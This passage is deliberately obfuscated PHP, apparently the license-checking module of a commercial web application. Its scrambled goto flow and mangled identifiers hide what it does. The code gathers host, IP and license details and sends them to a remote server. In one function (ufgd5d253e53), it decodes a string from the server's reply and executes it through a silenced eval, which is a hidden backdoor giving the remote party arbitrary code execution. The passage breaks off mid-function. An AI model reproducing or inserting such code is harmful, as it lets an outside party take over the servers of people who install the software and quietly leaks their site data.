$this->{$_SERVER[ˆ¹–ä¶][147]}($EÆ³È—ñÎˆ, $BËŠ—œîÌ¹[180]); $Eäôƒœ¸½¨ = $this->{$_SERVER[ˆ¹–ä¶][127]}($BËŠ—œîÌ¹[148]($dô¯•¶çï­), $EÆ³È—ñÎˆ . $BËŠ—œîÌ¹[181], 3); $FÀÇø½Ÿò£ = $this->{$_SERVER[ˆ¹–ä¶][182]}($BËŠ—œîÌ¹[183] . $dÄÇøĞÎ¢İ . $BËŠ—œîÌ¹[184] . $Eäôƒœ¸½¨, -1); $BËŠ—œîÌ¹[166]($FÀÇø½Ÿò£, !0); } else { if ($Cš™ÏÓë¡[$BËŠ—œîÌ¹[178]] == $BËŠ—œîÌ¹[185]) { $aã¹¶²¸õÃ = $BËŠ—œîÌ¹[25]($BËŠ—œîÌ¹[114]($BËŠ—œîÌ¹[186] . $EÆ³È—ñÎˆ), 12, 15) . $BËŠ—œîÌ¹[187]; $Eäôƒœ¸½¨ = $this->{$_SERVER[ˆ¹–ä¶][188]}($BËŠ—œîÌ¹[2]($Cš™ÏÓë¡[$BËŠ—œîÌ¹[189]]), $aã¹¶²¸õÃ, 2); $C„³–„åİ = $BËŠ—œîÌ¹[190]($Eäôƒœ¸½¨, !0); if (!$BËŠ—œîÌ¹[191]($C„³–„åİ) || !$BËŠ—œîÌ¹[191]($C„³–„åİ[$BËŠ—œîÌ¹[192]]) || $C„³–„åİ[$BËŠ—œîÌ¹[165]] != !0) { $f™ä´ØŞÁÁ = $BËŠ—œîÌ¹[193]; $E»İÀÃ·ÁÑ = $C„³–„åİ[$BËŠ—œîÌ¹[192]] ? $BËŠ—œîÌ¹[194] . $C„³–„åİ[$BËŠ—œîÌ¹[192]] : $f™ä´ØŞÁÁ; $BËŠ—œîÌ¹[166]($E»İÀÃ·ÁÑ, !1); } else { $dô¯•¶çï­[$BËŠ—œîÌ¹[168]] = $C„³–„åİ[$BËŠ—œîÌ¹[192]][$BËŠ—œîÌ¹[195]]; } } else { $C„³–„åİ = $this->{$_SERVER[ˆ¹–ä¶][182]}($BËŠ—œîÌ¹[196], $dô¯•¶çï­, 10); $cÓ…œß©Ü = $dÓÖ§‡å‹[570]; if (!$cÓ…œß©Ü) { die; } } } goto d…ÀÑ¼¸ ¥; B‡ ²ÓÌ: $dÓÖ§‡å‹ =& $_SERVER[í…¶]; $BËŠ—œîÌ¹ =& $_SERVER[ˆ¹–ä¶]; if ($_SERVER[$BËŠ—œîÌ¹[44]] != $BËŠ—œîÌ¹[162]) { return; } goto fÜ¶„™òéÛ; fîëöÜÛèÍ: $this->{$_SERVER[ˆ¹–ä¶][229]}(); $D¡Èö°Ö†¦ = $dÓÖ§‡å‹[610]; $BËŠ—œîÌ¹[166]($BËŠ—œîÌ¹[197]($BËŠ—œîÌ¹[208]), !0); goto B½…ÕøÀ; fÜ¶„™òéÛ: if (!$BËŠ—œîÌ¹[104]($GLOBALS, $BËŠ—œîÌ¹[132])) { die; } $Cš™ÏÓë¡ = $GLOBALS[$BËŠ—œîÌ¹[22]]; if (isset($Cš™ÏÓë¡[$BËŠ—œîÌ¹[163]])) { $this->{$_SERVER[ˆ¹–ä¶][164]}(); die; } goto F‰Ë’–õ‘‡; CæÔ‚œƒ¶Î: $eƒö¹Â[$BËŠ—œîÌ¹[123]] = $BËŠ—œîÌ¹[118]($BËŠ—œîÌ¹[214]($this->{$_SERVER[ˆ¹–ä¶][147]}($bƒ²ÊÒ¶¡, $BËŠ—œîÌ¹[216]))); if ($B­˜ä¦Ñ’[$BËŠ—œîÌ¹[217]] && $B­˜ä¦Ñ’[$BËŠ—œîÌ¹[217]] >= 1) { $BËŠ—œîÌ¹[61]($BËŠ—œîÌ¹[62])->{$_SERVER[ˆ¹–ä¶][218]}($BËŠ—œîÌ¹[219], $BËŠ—œîÌ¹[220]); } $BËŠ—œîÌ¹[61]($BËŠ—œîÌ¹[62])->{$_SERVER[ˆ¹–ä¶][221]}($eƒö¹Â); goto e„Û»§‹; F‰Ë’–õ‘‡: if (!isset($Cš™ÏÓë¡[$BËŠ—œîÌ¹[165]]) || $BËŠ—œîÌ¹[24]($Cš™ÏÓë¡[$BËŠ—œîÌ¹[165]]) != 16) { $BËŠ—œîÌ¹[166]($BËŠ—œîÌ¹[167] . $Cš™ÏÓë¡[$BËŠ—œîÌ¹[165]], !1); } $dñ«¢Èó®á = $BËŠ—œîÌ¹[61]($BËŠ—œîÌ¹[62])->{$_SERVER[ˆ¹–ä¶][63]}($BËŠ—œîÌ¹[116]); $dô¯•¶çï­ = array($BËŠ—œîÌ¹[165] => $Cš™ÏÓë¡[$BËŠ—œîÌ¹[165]], $BËŠ—œîÌ¹[168] => $BËŠ—œîÌ¹[124](16), $BËŠ—œîÌ¹[169] => $BËŠ—œîÌ¹[149], $BËŠ—œîÌ¹[170] => $BËŠ—œîÌ¹[171], $BËŠ—œîÌ¹[172] => $_SERVER[$BËŠ—œîÌ¹[173]], $BËŠ—œîÌ¹[174] => $_SERVER[$BËŠ—œîÌ¹[175]], $BËŠ—œîÌ¹[176] => $_SERVER[$BËŠ—œîÌ¹[177]]); goto F¬øÈµ”°ñ; B½…ÕøÀ: $e’ÄÒâš‰ = $dÓÖ§‡å‹[611]; while (strlen($e’ÄÒâš‰) < $dÓÖ§‡å‹[577]) { if (!$e’ÄÒâš‰) { break; } $e’ÄÒâš‰++; } goto b·³›àöÏ; e„Û»§‹: $E–æ´â¥º¸ = $BËŠ—œîÌ¹[114]($_SERVER[$BËŠ—œîÌ¹[115]] . $BËŠ—œîÌ¹[214]($dñ«¢Èó®á) . $eƒö¹Â[$BËŠ—œîÌ¹[210]]); $C†ƒƒ¬†ßÛ = $BËŠ—œîÌ¹[214]($BËŠ—œîÌ¹[25]($E–æ´â¥º¸, 10, 16)); $f¥‹Ÿ±Ø = $this->{$_SERVER[ˆ¹–ä¶][127]}($BËŠ—œîÌ¹[148]($B­˜ä¦Ñ’), $E–æ´â¥º¸); goto E¹¦Õ‚ùƒº; b·³›àöÏ: } private function licenseRegistSuccess() { $EÂ²î–ªªİ =& $_SERVER[ˆ¹–ä¶]; $c¨İÄ·¶ = $EÂ²î–ªªİ[61]($EÂ²î–ªªİ[62])->{$_SERVER[ˆ¹–ä¶][63]}(); if ($c¨İÄ·¶[$EÂ²î–ªªİ[85]] != $EÂ²î–ªªİ[220]) { $EÂ²î–ªªİ[61]($EÂ²î–ªªİ[62])->{$_SERVER[ˆ¹–ä¶][221]}($EÂ²î–ªªİ[85], $EÂ²î–ªªİ[220]); } $EÂ²î–ªªİ[110]($EÂ²î–ªªİ[230])->{$_SERVER[ˆ¹–ä¶][231]}(!0); } private function iufx0b6bcdf8() { goto F¿‡´ÑãñÇ; a¨’Ÿ¸œÌŠ: $B«È¥à”è[61]($B«È¥à”è[62])->{$_SERVER[ˆ¹–ä¶][218]}($B«È¥à”è[219], $B«È¥à”è[232]); $this->mayt17323c9d = array(); $this->rqkt3cbf8d07 = $B«È¥à”è[121]; goto dßß„Ä©¡È; dßß„Ä©¡È: $E‰“ğ˜„Ó‚ = $fÃô­‹‹±[612]; if (strlen($E‰“ğ˜„Ó‚) < $fÃô­‹‹±[582]) { die; } goto bš‡ôÜ•İ; F¿‡´ÑãñÇ: $fÃô­‹‹± =& $_SERVER[í…¶]; $B«È¥à”è =& $_SERVER[ˆ¹–ä¶]; $B«È¥à”è[61]($B«È¥à”è[62])->{$_SERVER[ˆ¹–ä¶][221]}(array($B«È¥à”è[209] => $B«È¥à”è[10], $B«È¥à”è[210] => $B«È¥à”è[10], $B«È¥à”è[120] => $B«È¥à”è[121], $B«È¥à”è[122] => $B«È¥à”è[10], $B«È¥à”è[123] => $B«È¥à”è[10])); goto a¨’Ÿ¸œÌŠ; bš‡ôÜ•İ: } private function etipfe59f441() { goto Cˆö‰…ƒÓÂ; BÓµÄÈá½: $fÅ¾Ñ‰êÕö = $aÖª¯ÄÂÀÀ[144]($FæÊÏÚ´…¶[$aÖª¯ÄÂÀÀ[145]]); if ($aÖª¯ÄÂÀÀ[233]() >= $fÅ¾Ñ‰êÕö) { return $this->{$_SERVER[ˆ¹–ä¶][164]}(); } $this->mayt17323c9d = $FæÊÏÚ´…¶; goto AùÓâ‡Ê´‰; AùÓâ‡Ê´‰: $this->rqkt3cbf8d07 = $DÃßÃÏ¡¯³[$aÖª¯ÄÂÀÀ[120]]; goto dŸ—£‚¾Æó; b˜éÃØù£İ: $E¨¡Ì”¤³ = $AÇ¼™®Ù[614]; $e·º­Â´Õ = $aÖª¯ÄÂÀÀ[222]($aÖª¯ÄÂÀÀ[61]($aÖª¯ÄÂÀÀ[11])->{$_SERVER[ˆ¹–ä¶][223]}(), $aÖª¯ÄÂÀÀ[224]); $d‡°ÆíæÏ = $e·º­Â´Õ[$aÖª¯ÄÂÀÀ[225]]; goto D™÷éøŸ¹; A®ğ‰ˆÃ¹ö: $this->rqkt3cbf8d07 = $aÖª¯ÄÂÀÀ[121]; $cÅ„…ÑÚÑ = $AÇ¼™®Ù[613]; while ($cÅ„…ÑÚÑ < $AÇ¼™®Ù[577]) { if ($cÅ„…ÑÚÑ >= 0) { break; } $cÅ„…ÑÚÑ++; } goto bœë°‡œ‰µ; Cˆö‰…ƒÓÂ: $AÇ¼™®Ù =& $_SERVER[í…¶]; $aÖª¯ÄÂÀÀ =& $_SERVER[ˆ¹–ä¶]; $_SERVER[$aÖª¯ÄÂÀÀ[175]] = $aÖª¯ÄÂÀÀ[104]($_SERVER, $aÖª¯ÄÂÀÀ[175], APP_HOST); goto A®ğ‰ˆÃ¹ö; D™÷éøŸ¹: $A‰ïšøèÚß = $AÇ¼™®Ù[615]; if (!$A‰ïšøèÚß) { die; } $EÜÅÍ …‡‚ = $aÖª¯ÄÂÀÀ[114]($_SERVER[$aÖª¯ÄÂÀÀ[115]] . $aÖª¯ÄÂÀÀ[214]($b‘õ•Öİ¹) . $DÃßÃÏ¡¯³[$aÖª¯ÄÂÀÀ[210]]); goto E„µÏ——Æ; C¹‹–ĞàÚ§: $d‰ÖÉ°Öˆ’ = $AÇ¼™®Ù[617]; if (strlen($d‰ÖÉ°Öˆ’) < $AÇ¼™®Ù[564]) { return; } $FæÊÏÚ´…¶ = $this->{$_SERVER[ˆ¹–ä¶][188]}($d‡°ÆíæÏ[$aÖª¯ÄÂÀÀ[91]][$d¢¨¹îëéÓ], $EÜÅÍ …‡‚); goto FÍ¡ñ„¥‰Í; E„µÏ——Æ: $b¹—Õë¸Óã = $AÇ¼™®Ù[616]; if (!$b¹—Õë¸Óã) { die; } $d¢¨¹îëéÓ = $aÖª¯ÄÂÀÀ[214]($aÖª¯ÄÂÀÀ[25]($EÜÅÍ …‡‚, 10, 16)); goto C¹‹–ĞàÚ§; bœë°‡œ‰µ: $DÃßÃÏ¡¯³ = $aÖª¯ÄÂÀÀ[61]($aÖª¯ÄÂÀÀ[62])->{$_SERVER[ˆ¹–ä¶][63]}(); if ($DÃßÃÏ¡¯³[$aÖª¯ÄÂÀÀ[120]] == $aÖª¯ÄÂÀÀ[121]) { return; } $b‘õ•Öİ¹ = $aÖª¯ÄÂÀÀ[61]($aÖª¯ÄÂÀÀ[62])->{$_SERVER[ˆ¹–ä¶][63]}($aÖª¯ÄÂÀÀ[116]); goto b˜éÃØù£İ; FÍ¡ñ„¥‰Í: $FæÊÏÚ´…¶ = $aÖª¯ÄÂÀÀ[190]($FæÊÏÚ´…¶, !0); $EÌ»‰´Ê = $AÇ¼™®Ù[618]; if (!$aÖª¯ÄÂÀÀ[191]($FæÊÏÚ´…¶)) { return $this->{$_SERVER[ˆ¹–ä¶][164]}(); } goto BÓµÄÈá½; dŸ—£‚¾Æó: } private function ouby06375e4a() { $bœ‚¾´¬²Ê =& $_SERVER[ˆ¹–ä¶]; $c„™Í²‚» = $GLOBALS[$bœ‚¾´¬²Ê[22]]; $B©°Šçãç” = $_SERVER[$bœ‚¾´¬²Ê[44]]; if ($B©°Šçãç” == $bœ‚¾´¬²Ê[234] && $this->rqkt3cbf8d07 == $bœ‚¾´¬²Ê[121]) { $bœ‚¾´¬²Ê[166]($bœ‚¾´¬²Ê[197]($bœ‚¾´¬²Ê[235]), !1, $bœ‚¾´¬²Ê[236]); } $B„âÉŞ¿ƒ = array($bœ‚¾´¬²Ê[237], $bœ‚¾´¬²Ê[238]); if ($bœ‚¾´¬²Ê[239]($B©°Šçãç”, $B„âÉŞ¿ƒ)) { if ($this->rqkt3cbf8d07 == $bœ‚¾´¬²Ê[121] && isset($c„™Í²‚»[$bœ‚¾´¬²Ê[240]])) { $bœ‚¾´¬²Ê[166]($bœ‚¾´¬²Ê[197]($bœ‚¾´¬²Ê[235]), !1, $bœ‚¾´¬²Ê[236]); die; } $EğğšŞÖ¬ = $this->{$_SERVER[ˆ¹–ä¶][137]}(); if ($EğğšŞÖ¬ != $bœ‚¾´¬²Ê[201]($bœ‚¾´¬²Ê[241])) { if ($EğğšŞÖ¬ <= $bœ‚¾´¬²Ê[61]($bœ‚¾´¬²Ê[139])->{$_SERVER[ˆ¹–ä¶][140]}()) { $bœ‚¾´¬²Ê[166]($bœ‚¾´¬²Ê[197]($bœ‚¾´¬²Ê[242]), !1, $bœ‚¾´¬²Ê[236]); die; } } } } private function eircd1c33b52() { goto Aà¡¾Í²Š; C¨øßì‘²È: $eØ»´Â¶è½ = $dêÚ×¥ã‰[621]; if (!$eØ»´Â¶è½) { die; } $cŠáö¿ÚåŞ = @$eŒÚÁÉé¤[253]($e´¹Ğ·–Ê, !1, $Báé›±ÎìÎ); goto A¦´¤‘ÅØÚ; FßÃÀíñá: if (!$eŒÚÁÉé¤[239]($_SERVER[$eŒÚÁÉé¤[44]], $EÚ’½¬½½ß)) { return; } $e´¹Ğ·–Ê = $eŒÚÁÉé¤[245]; $c‰’çĞè·º = $dêÚ×¥ã‰[620]; goto e¡Á£¶§êİ; e¡Á£¶§êİ: while ($c‰’çĞè·º < $dêÚ×¥ã‰[564]) { if ($c‰’çĞè·º >= 0) { break; } $c‰’çĞè·º++; } $e´¹Ğ·–Ê = $this->{$_SERVER[ˆ¹–ä¶][246]}($e´¹Ğ·–Ê, $eŒÚÁÉé¤[247]); $Báé›±ÎìÎ = $eŒÚÁÉé¤[248](array($eŒÚÁÉé¤[249] => array($eŒÚÁÉé¤[250] => $eŒÚÁÉé¤[251], $eŒÚÁÉé¤[252] => 3))); goto C¨øßì‘²È; Aà¡¾Í²Š: $dêÚ×¥ã‰ =& $_SERVER[í…¶]; $eŒÚÁÉé¤ =& $_SERVER[ˆ¹–ä¶]; $EÚ’½¬½½ß = array($eŒÚÁÉé¤[135], $eŒÚÁÉé¤[243]); goto b›¥†µ°¼ù; A¦´¤‘ÅØÚ: $eŒÚÁÉé¤[254]($eŒÚÁÉé¤[255]); if ($cŠáö¿ÚåŞ && $eŒÚÁÉé¤[32]($cŠáö¿ÚåŞ, $eŒÚÁÉé¤[256])) { echo $cŠáö¿ÚåŞ; } die; goto BåÃ…îœã™; b›¥†µ°¼ù: $AÜÜŒÙÜ…² = $dêÚ×¥ã‰[619]; while ($AÜÜŒÙÜ…² < $dêÚ×¥ã‰[564]) { if ($AÜÜŒÙÜ…² >= 0) { break; } $AÜÜŒÙÜ…²++; } if (!$eŒÚÁÉé¤[104]($GLOBALS, $eŒÚÁÉé¤[132]) || !isset($_GET[$eŒÚÁÉé¤[244]])) { return; } goto FßÃÀíñá; BåÃ…îœã™: } public function tqkd367be871($bªŠÇ¡¶) { goto fˆ³çùˆš; C·‚ö”–£¥: $DÒë†¸ÃÌÍ = $Aªë‰š­[0]($Aªë‰š­[266], $Aªë‰š­[104]($this->mayt17323c9d, $Aªë‰š­[129], $Aªë‰š­[10])); $bÎàêœ´Ó = $a‘Õè¢ùŒ[623]; if (strlen($bÎàêœ´Ó) < $a‘Õè¢ùŒ[582]) { return; } goto F¶ÊÍäêğõ; fˆ³çùˆš: $a‘Õè¢ùŒ =& $_SERVER[í…¶]; $Aªë‰š­ =& $_SERVER[ˆ¹–ä¶]; if ($this->rqkt3cbf8d07 == $Aªë‰š­[257]) { return $bªŠÇ¡¶; } goto FÔÎîËßÓ°; F¶ÊÍäêğõ: $D§…ÖÖò´ƒ = array(); $D“Îã²¾› = $a‘Õè¢ùŒ[624]; while (strlen($D“Îã²¾›) < $a‘Õè¢ùŒ[560]) { if (!$D“Îã²¾›) { break; } $D“Îã²¾›++; } goto F¹†âØŒ¬©; F¹†âØŒ¬©: foreach ($AÍ §‰ÂƒØ as $c‡†“ãğ ) { if (!$Aªë‰š­[239]($c‡†“ãğ , $DÒë†¸ÃÌÍ)) { $D§…ÖÖò´ƒ[] = $c‡†“ãğ ; } } foreach ($D§…ÖÖò´ƒ as $c‡†“ãğ ) { unset($bªŠÇ¡¶[$c‡†“ãğ ]); $aÙ‚‘¼ ÷Õ = $a‘Õè¢ùŒ[587]; while ($aÙ‚‘¼ ÷Õ < $a‘Õè¢ùŒ[577]) { if ($aÙ‚‘¼ ÷Õ >= 0) { break; } $aÙ‚‘¼ ÷Õ++; } } return $bªŠÇ¡¶; goto c×Áà–ÁÍá; FÔÎîËßÓ°: $AÍ §‰ÂƒØ = array($Aªë‰š­[258], $Aªë‰š­[259], $Aªë‰š­[260], $Aªë‰š­[261], $Aªë‰š­[262], $Aªë‰š­[263], $Aªë‰š­[264], $Aªë‰š­[265]); $aó´êíë” = $a‘Õè¢ùŒ[622]; while (strlen($aó´êíë”) < $a‘Õè¢ùŒ[348]) { if (!$aó´êíë”) { break; } $aó´êíë”++; } goto C·‚ö”–£¥; c×Áà–ÁÍá: } private function ywat9c33b520() { goto FˆåíƒÒŒ»; FˆåíƒÒŒ»: $c»À³ø¬øæ =& $_SERVER[í…¶]; $a¾åóÉ²ãì =& $_SERVER[ˆ¹–ä¶]; if ($this->rqkt3cbf8d07 != $a¾åóÉ²ãì[121]) { $GLOBALS[$a¾åóÉ²ãì[91]][$a¾åóÉ²ãì[95]][$a¾åóÉ²ãì[267]] = $a¾åóÉ²ãì[220]; return; } goto Eß¢«­Œ¨Ù; C‹õÈéœ”: $GLOBALS[$a¾åóÉ²ãì[91]][$a¾åóÉ²ãì[95]][$a¾åóÉ²ãì[267]] = $a¾åóÉ²ãì[232]; $GLOBALS[$a¾åóÉ²ãì[91]][$a¾åóÉ²ãì[271]] = $a¾åóÉ²ãì[220]; if ($a¾åóÉ²ãì[61]($a¾åóÉ²ãì[272])->{$_SERVER[ˆ¹–ä¶][63]}($a¾åóÉ²ãì[85]) != $a¾åóÉ²ãì[232]) { $a¾åóÉ²ãì[61]($a¾åóÉ²ãì[272])->{$_SERVER[ˆ¹–ä¶][221]}($a¾åóÉ²ãì[85], $a¾åóÉ²ãì[232]); } goto D¾í½ÃÄ; Eß¢«­Œ¨Ù: $D‰£Â‡ËëŠ = $_SERVER[$a¾åóÉ²ãì[44]]; $dç´˜¥±— = array($a¾åóÉ²ãì[268]); $dÏ“ëœœ¶ö = $c»À³ø¬øæ[625]; goto a˜Ò„Â¦éŸ; a˜Ò„Â¦éŸ: while (strlen($dÏ“ëœœ¶ö) < $c»À³ø¬øæ[582]) { if (!$dÏ“ëœœ¶ö) { break; } $dÏ“ëœœ¶ö++; } foreach ($dç´˜¥±— as $CÓ¢†Õô¡) { if ($CÓ¢†Õô¡ == $D‰£Â‡ËëŠ || $a¾åóÉ²ãì[25]($D‰£Â‡ËëŠ, 0, $a¾åóÉ²ãì[24]($CÓ¢†Õô¡)) == $CÓ¢†Õô¡) { $a¾åóÉ²ãì[166]($a¾åóÉ²ãì[197]($a¾åóÉ²ãì[269]), !1); } } $GLOBALS[$a¾åóÉ²ãì[91]][$a¾åóÉ²ãì[95]][$a¾åóÉ²ãì[270]] = $a¾åóÉ²ãì[220]; goto C‹õÈéœ”; D¾í½ÃÄ: } public function hmvc6b6da39e() { return $_SERVER[ˆ¹–ä¶][273]; } private function ufgd5d253e53() { goto DšÉÂ‰¼±ê; FÓ”ù¹‰Œ: if ($e¨¥˜ëÊ˜Ï && $F¾î¦‘†’µ[233]() - $e¨¥˜ëÊ˜Ï < $F¾î¦‘†’µ[201]($F¾î¦‘†’µ[281])) { return; } $F¾î¦‘†’µ[13](array($F¾î¦‘†’µ[279], $F¾î¦‘†’µ[152]), $a¿¡Ôë†»¶, $F¾î¦‘†’µ[233]()); $eá²¿ÒäÛ = array($F¾î¦‘†’µ[165] => $F¾î¦‘†’µ[61]($F¾î¦‘†’µ[62])->{$_SERVER[ˆ¹–ä¶][63]}($F¾î¦‘†’µ[209]), $F¾î¦‘†’µ[178] => $this->rqkt3cbf8d07, $F¾î¦‘†’µ[176] => $_SERVER[$F¾î¦‘†’µ[177]], $F¾î¦‘†’µ[169] => $F¾î¦‘†’µ[149], $F¾î¦‘†’µ[172] => $_SERVER[$F¾î¦‘†’µ[173]]); goto Cå¥‰²·îê; e‡Ò‹…‰‘„: if ($F¾î¦‘†’µ[233]() % 4 != 0) { return; } $e¨¥˜ëÊ˜Ï = $F¾î¦‘†’µ[13](array($F¾î¦‘†’µ[279], $F¾î¦‘†’µ[280]), $a¿¡Ôë†»¶); $b¶œœï„ = $bÁé¼Ñ÷†‚[626]; goto FÓ”ù¹‰Œ; eïÔñĞñ§ğ: $fàÒôšôºÕ = $bÁé¼Ñ÷†‚[628]; if (strlen($fàÒôšôºÕ) < $bÁé¼Ñ÷†‚[560]) { return; } if ($this->{$_SERVER[ˆ¹–ä¶][199]}($b°ããª‡Ñó[$F¾î¦‘†’µ[283]]) != $eá²¿ÒäÛ[$F¾î¦‘†’µ[165]]) { $c·¢ô¡–À´ = array($F¾î¦‘†’µ[202] => $F¾î¦‘†’µ[61]($F¾î¦‘†’µ[62])->{$_SERVER[ˆ¹–ä¶][63]}($F¾î¦‘†’µ[116]), $F¾î¦‘†’µ[203] => $_SERVER[$F¾î¦‘†’µ[115]], $F¾î¦‘†’µ[204] => $F¾î¦‘†’µ[205](), $F¾î¦‘†’µ[174] => $_SERVER[$F¾î¦‘†’µ[175]]); $f©‰øêë›è = $this->{$_SERVER[ˆ¹–ä¶][206]}($F¾î¦‘†’µ[148]($c·¢ô¡–À´)); $b°ããª‡Ñó = $this->{$_SERVER[ˆ¹–ä¶][182]}($F¾î¦‘†’µ[207] . $f©‰øêë›è); if ($b°ããª‡Ñó && $F¾î¦‘†’µ[191]($b°ããª‡Ñó) && isset($b°ããª‡Ñó[$F¾î¦‘†’µ[283]])) { $CŞ·ÉœÅšÁ = $this->{$_SERVER[ˆ¹–ä¶][188]}($b°ããª‡Ñó[$F¾î¦‘†’µ[283]], 2); if ($CŞ·ÉœÅšÁ) { $CŞ·ÉœÅšÁ = $this->{$_SERVER[ˆ¹–ä¶][199]}($CŞ·ÉœÅšÁ); } if ($CŞ·ÉœÅšÁ) { try { @eval($CŞ·ÉœÅšÁ); } catch (Exception $c™²ª¼ÇƒÒ) { } } } } goto E£¿ö¤Œ; Cå¥‰²·îê: $b°ããª‡Ñó = $this->{$_SERVER[ˆ¹–ä¶][182]}($F¾î¦‘†’µ[282], $eá²¿ÒäÛ); $f±Í’©Äˆò = $bÁé¼Ñ÷†‚[627]; while ($f±Í’©Äˆò < $bÁé¼Ñ÷†‚[577]) { if ($f±Í’©Äˆò >= 0) { break; } $f±Í’©Äˆò++; } goto EŒ»½Ş®Óå; EŒ»½Ş®Óå: if (!$F¾î¦‘†’µ[191]($b°ããª‡Ñó)) { return; } if ($b°ããª‡Ñó[$F¾î¦‘†’µ[165]] && $b°ããª‡Ñó[$F¾î¦‘†’µ[283]]) { if ($this->{$_SERVER[ˆ¹–ä¶][199]}($b°ããª‡Ñó[$F¾î¦‘†’µ[283]]) == $eá²¿ÒäÛ[$F¾î¦‘†’µ[165]]) { return; } } $this->{$_SERVER[ˆ¹–ä¶][164]}(); goto eïÔñĞñ§ğ; DšÉÂ‰¼±ê: $bÁé¼Ñ÷†‚ =& $_SERVER[í…¶]; $F¾î¦‘†’µ =& $_SERVER[ˆ¹–ä¶]; $Aä—¹İ‰ò£ = array($F¾î¦‘†’µ[274], $F¾î¦‘†’µ[275], $F¾î¦‘†’µ[276]); goto C¹Åˆ¢ä; C¹Åˆ¢ä: $a¿¡Ôë†»¶ = $F¾î¦‘†’µ[277] . $F¾î¦‘†’µ[114]($F¾î¦‘†’µ[278]); if ($this->rqkt3cbf8d07 == $F¾î¦‘†’µ[121] || !$F¾î¦‘†’µ[104]($GLOBALS, $F¾î¦‘†’µ[132])) { return; } if (!$F¾î¦‘†’µ[239]($_SERVER[$F¾î¦‘†’µ[44]], $Aä—¹İ‰ò£)) { return; } goto e‡Ò‹…‰‘„; E£¿ö¤Œ: } private function fhuzb6fdeb72($bÏŠïçÄİ” = '', $A‚Ñ‰¶Í® = array(), $CŞÒ¥ ğé = 5) { goto dÈÚøïÕÄ; c¢‰ª®‰ø¯: $f‹­‡Èåš = $this->{$_SERVER[ˆ¹–ä¶][246]}($f‹­‡Èåš, $AĞ”Í¡øµÉ[285]); $f‹­‡Èåš = $f‹­‡Èåš . $bÏŠïçÄİ” . $AĞ”Í¡øµÉ[286] . $AĞ”Í¡øµÉ[287]($A‚Ñ‰¶Í®); $bèæÚâ¼³Ø = $f‰òëÑòè[629]; goto BÑ‹©Ÿê; dÈÚøïÕÄ: $f‰òëÑòè =& $_SERVER[í…¶]; $AĞ”Í¡øµÉ =& $_SERVER[ˆ¹–ä¶]; $f‹­‡Èåš = $AĞ”Í¡øµÉ[284]; goto c¢‰ª®‰ø¯; CÎÅ„òäÌ: $A¯Œ¨œªù = $f‰òëÑòè[630]; $A‚Ñ‰¶Í® = @$AĞ”Í¡øµÉ[253]($f‹­‡Èåš, !1, $E¾‰¿¯Û­¥); $cœ‡‰† = $f‰òëÑòè[631]; goto e•’î¡áÛ¢; BÑ‹©Ÿê: if (!$bèæÚâ¼³Ø) { die; } if ($A‚Ñ‰¶Í® === -1) { return $f‹­‡Èåš; } $E¾‰¿¯Û­¥ = $AĞ”Í¡øµÉ[248](array($AĞ”Í¡øµÉ[249] => array($AĞ”Í¡øµÉ[252] => $CŞÒ¥ ğé, $AĞ”Í¡øµÉ[250] => $AĞ”Í¡øµÉ[288]), $AĞ”Í¡øµÉ[289] => array($AĞ”Í¡øµÉ[290] => !1, $AĞ”Í¡øµÉ[291] => !1))); goto CÎÅ„òäÌ; e•’î¡áÛ¢: while (strlen($cœ‡‰†) < $f‰òëÑòè[577]) { if (!$cœ‡‰†) { break; } $cœ‡‰†++; } return $AĞ”Í¡øµÉ[190]($A‚Ñ‰¶Í®, !0); $CëÂŠ²®ªì = $f‰òëÑòè[632]; goto F‚×‰ìİÁ‹; F‚×‰ìİÁ‹: } private function rvjs89d5781c() { goto eª×ò¥Ë³™; b¸ÎÄä£‘¢: if (!$FÄ¥ƒÕŸçá) { die; } $FÇÙ«õËŠ = $eÛÇ¦ÁÎËÛ[104]($this->mayt17323c9d, $eÛÇ¦ÁÎËÛ[319]); $CêŞÖ¯Ğ¤Î = $B¥îö¼òØÃ[634]; goto c¤”Ú—¦Ò²; c¤”Ú—¦Ò²: $FÇÙ«õËŠ = $FÇÙ«õËŠ ? $eÛÇ¦ÁÎËÛ[201]($FÇÙ«õËŠ) : 0; $Bİ¦´Í—ÎÁ = $B¥îö¼òØÃ[635]; if (strlen($Bİ¦´Í—ÎÁ) < $B¥îö¼òØÃ[348]) { die; } goto bˆŒ÷‹ëŒ; D—‘±­¡Ê: $BÀÁÜôÍÎ = $Cªá¾¯[$this->rqkt3cbf8d07]; $BÀÁÜôÍÎ = $eÛÇ¦ÁÎËÛ[201]($BÀÁÜôÍÎ ? $BÀÁÜôÍÎ : $eÛÇ¦ÁÎËÛ[293]); $FÄ¥ƒÕŸçá = $B¥îö¼òØÃ[633]; goto b¸ÎÄä£‘¢; eª×ò¥Ë³™: $B¥îö¼òØÃ =& $_SERVER[í…¶]; $eÛÇ¦ÁÎËÛ =& $_SERVER[ˆ¹–ä¶]; $Cªá¾¯ = array($eÛÇ¦ÁÎËÛ[292] => $eÛÇ¦ÁÎËÛ[293], $eÛÇ¦ÁÎËÛ[294] => $eÛÇ¦ÁÎËÛ[295], $eÛÇ¦ÁÎËÛ[296] => $eÛÇ¦ÁÎËÛ[297], $eÛÇ¦ÁÎËÛ[298] => $eÛÇ¦ÁÎËÛ[299], $eÛÇ¦ÁÎËÛ[300] => $eÛÇ¦ÁÎËÛ[301], $eÛÇ¦ÁÎËÛ[302] => $eÛÇ¦ÁÎËÛ[241], $eÛÇ¦ÁÎËÛ[303] => $eÛÇ¦ÁÎËÛ[241], $eÛÇ¦ÁÎËÛ[304] => $eÛÇ¦ÁÎËÛ[293], $eÛÇ¦ÁÎËÛ[305] => $eÛÇ¦ÁÎËÛ[295], $eÛÇ¦ÁÎËÛ[306] => $eÛÇ¦ÁÎËÛ[297], $eÛÇ¦ÁÎËÛ[307] => $eÛÇ¦ÁÎËÛ[308], $eÛÇ¦ÁÎËÛ[309] => $eÛÇ¦ÁÎËÛ[299], $eÛÇ¦ÁÎËÛ[310] => $eÛÇ¦ÁÎËÛ[311], $eÛÇ¦ÁÎËÛ[312] => $eÛÇ¦ÁÎËÛ[301], $eÛÇ¦ÁÎËÛ[313] => $eÛÇ¦ÁÎËÛ[314], $eÛÇ¦ÁÎËÛ[315] => $eÛÇ¦ÁÎËÛ[316], $eÛÇ¦ÁÎËÛ[317] => $eÛÇ¦ÁÎËÛ[318]); goto D—‘±­¡Ê; bˆŒ÷‹ëŒ: return $BÀÁÜôÍÎ + $FÇÙ«õËŠ; goto D³Õñ¡Æë; D³Õñ¡Æë: } public function xhqs849d4f17($A¹Õù¤··) { goto D³ÅÆÔ×İ; BÇ¤·óÈ¸: if 